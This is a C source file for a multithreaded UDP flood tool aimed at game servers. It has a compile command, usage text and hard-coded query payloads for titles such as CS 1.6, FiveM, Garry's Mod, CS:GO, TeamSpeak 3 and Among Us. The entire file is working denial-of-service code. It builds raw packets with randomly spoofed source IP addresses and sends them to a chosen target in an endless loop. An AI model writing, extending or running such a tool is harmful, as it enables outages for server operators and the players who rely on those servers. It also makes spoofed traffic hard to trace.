/*
Game Server Flood - UDP Custom
Compile: gcc -o game_flood game_flood.c -pthread -O3
*/

#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned int port;
static unsigned int sport;
static unsigned int lench;
char *packetstrx;
static unsigned int Q[4096], c = 362436;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

char tip[16];
char sip[16];

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) { oddbyte = 0; *((u_char *)&oddbyte) = *(u_char *)ptr; sum += oddbyte; }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void *flood(void *par1) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s == -1) { perror("Socket error"); exit(1); }
    
    char datagram[4096], source_ip[32];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t udp_length;
    } psh;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr(tip);
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + lench;
    iph->id = htonl(rand() % 54321);
    iph->frag_off = 0;
    iph->ttl = 128;
    iph->protocol = 17;
    iph->check = 0;
    
    int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + lench;
    char *pseudogram = malloc(psize);
    
    memcpy((void *)udph + sizeof(struct udphdr), packetstrx, lench);
    udph->len = htons(sizeof(struct udphdr) + lench);
    
    while (1) {
        snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
        
        iph->saddr = inet_addr(source_ip);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        
        if (sport == 0) { udph->source = htons(15000 + rand() % 45000); }
        else { udph->source = sport; }
        
        if (port == 0) { udph->dest = htons(1 + rand() % 15000); }
        else { udph->dest = port; }
        
        udph->check = 0;
        psh.source_address = inet_addr(source_ip);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_UDP;
        psh.udp_length = htons(sizeof(struct udphdr) + lench);
        
        memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + lench);
        udph->check = csum((unsigned short *)pseudogram, psize);
        
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        pps++;
    }
}

int main(int argc, char *argv[]) {
    if (argc < 8) {
        printf("Usage: %s <target> <port> <src_port> <src_ip> <threads> <pps> <time> <game>\n", argv[0]);
        printf("Games: cs16, fivem, fivem2, gmod, csgo, ts3, amongus, source\n");
        exit(-1);
    }
    
    strcpy(tip, argv[1]);
    port = htons(atoi(argv[2]));
    sport = htons(atoi(argv[3]));
    strcpy(sip, argv[4]);
    int num_threads = atoi(argv[5]);
    int maxpps = atoi(argv[6]);
    char *game = argv[8];
    
    if (strcmp(game, "cs16") == 0) {
        lench = 23;
        packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x73\x74\x65\x61\x6d\x0a";
    } else if (strcmp(game, "fivem") == 0) {
        lench = 15;
        packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x78\x78";
    } else if (strcmp(game, "gmod") == 0) {
        lench = 23;
        packetstrx = "\xff\xff\xff\xff\x71\x96\x9e\x53\x05\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x00";
    } else if (strcmp(game, "csgo") == 0) {
        lench = 23;
        packetstrx = "\xff\xff\xff\xff\x71\x63\x6f\x6e\x6e\x65\x63\x74\x30\x78\x30\x30\x30\x30\x30\x30\x30\x30\x00";
    } else if (strcmp(game, "ts3") == 0) {
        lench = 34;
        packetstrx = "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x0c\x26\x87\xdd\x00\x5d\x36\xdb\xe3\xae\xa9\xc3\x8d\x00\x00\x00\x00\x00\x00\x00\x00";
    } else if (strcmp(game, "amongus") == 0) {
        lench = 13;
        packetstrx = "\xe3\x54\x0a\x4f\x6e\x6c\x69\x6e\x65\x47\x61\x6d\x65";
    } else if (strcmp(game, "source") == 0) {
        lench = 25;
        packetstrx = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
    } else {
        lench = 15;
        packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x78\x78";
    }
    
    pthread_t thread[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, NULL);
    }
    
    int multiplier = 20;
    for (int i = 0; i < (atoi(argv[7]) * multiplier); i++) {
        usleep((1000 / multiplier) * 1000);
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) { sleeptime += 100; }
            else { limiter--; }
        } else {
            limiter++;
            if (sleeptime > 25) { sleeptime -= 25; }
            else { sleeptime = 0; }
        }
        pps = 0;
    }
    return 0;
}
